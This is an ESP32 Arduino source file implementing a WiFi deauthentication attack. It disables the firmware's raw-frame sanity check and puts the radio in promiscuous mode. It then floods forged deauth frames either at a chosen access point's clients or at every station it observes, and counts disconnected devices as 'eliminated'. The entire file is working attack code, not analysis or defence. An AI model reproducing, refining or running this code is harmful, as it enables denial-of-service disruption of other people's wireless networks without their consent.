#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_arduino_version.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"

deauth_frame_t deauth_frame;
int deauth_type = DEAUTH_TYPE_SINGLE;
int eliminated_stations;

// --- debug instrumentation (prints throttled to one line / 2 s) ---
static volatile uint32_t deauth_dbg_hits = 0;
static uint32_t deauth_dbg_last = 0;

static void deauth_dbg_tx(esp_err_t rc) {
  uint32_t now = millis();
  if (now - deauth_dbg_last >= 2000) {
    deauth_dbg_last = now;
    Serial.printf("[deauth] hits=%lu elim=%d tx=%d (%s)\n",
                  (unsigned long)deauth_dbg_hits, eliminated_stations,
                  (int)rc, rc == ESP_OK ? "ESP_OK" : "FAIL");
  }
}

// On IDF 4.4 (core 2.x) the sanity check is a weak symbol that must return 0
// for raw frames to transmit; on IDF 5.x cores it is already provided by
// libnet80211.a and must not be redefined.
#if defined(ESP_ARDUINO_VERSION_MAJOR) && (ESP_ARDUINO_VERSION_MAJOR < 3)
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}
#endif

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  if (packet_length < 0) return;

  esp_err_t rc = ESP_OK;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) rc = esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_stations++;
      deauth_dbg_hits++;
      deauth_dbg_tx(rc);
    } else return;
  } else {
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      memcpy(deauth_frame.access_point, mac_header->dest, 6);
      memcpy(deauth_frame.sender, mac_header->dest, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) rc = esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_stations++;
      deauth_dbg_hits++;
      deauth_dbg_tx(rc);
    } else return;
  }
}

void start_deauth(const uint8_t *bssid, int channel, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  deauth_type = attack_type;

  deauth_frame.reason = reason;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    // Bring up a hidden AP on the target's channel so the AP interface
    // can transmit deauth frames there.
    bool ap = WiFi.softAP(AP_SSID, AP_PASS, channel, 1);
    memcpy(deauth_frame.access_point, bssid, 6);
    memcpy(deauth_frame.sender, bssid, 6);
    Serial.printf("[deauth] start single bssid=%02X:%02X:%02X:%02X:%02X:%02X ch=%d reason=%u softAP=%d\n",
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                  channel, reason, (int)ap);
  } else {
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
    Serial.printf("[deauth] start all reason=%u\n", reason);
  }

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void stop_deauth() {
  esp_wifi_set_promiscuous(false);
  WiFi.softAPdisconnect();
  WiFi.mode(WIFI_MODE_STA);
}
